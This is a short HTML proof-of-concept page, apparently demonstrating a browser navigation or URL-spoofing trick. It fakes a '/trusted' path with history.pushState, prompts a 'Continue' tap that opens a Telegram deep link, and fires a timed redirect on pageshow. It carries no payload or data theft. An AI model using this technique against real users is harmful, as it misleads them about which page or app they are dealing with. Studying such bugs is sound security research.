<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Continue</h2>
  <p>Tap the button below.</p>
  <button onclick="action()">Continue</button>
  <div class="notice">Demo only</div>
</div>

<script>
function logEvent() {}

function action() {
  setTimeout(() => {
    location.href = 'tg://resolve?domain=telegram';
  }, 300);
}

const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');

trigger.onclick = () => {
  logEvent("poc_started");
  history.pushState({}, '', '/trusted');
  logEvent("pushstate_done", { path: location.pathname });
  panel.style.display = 'block';
};

window.addEventListener('pageshow', () => {
  logEvent("pageshow");

  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        logEvent("navigation_triggered");
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
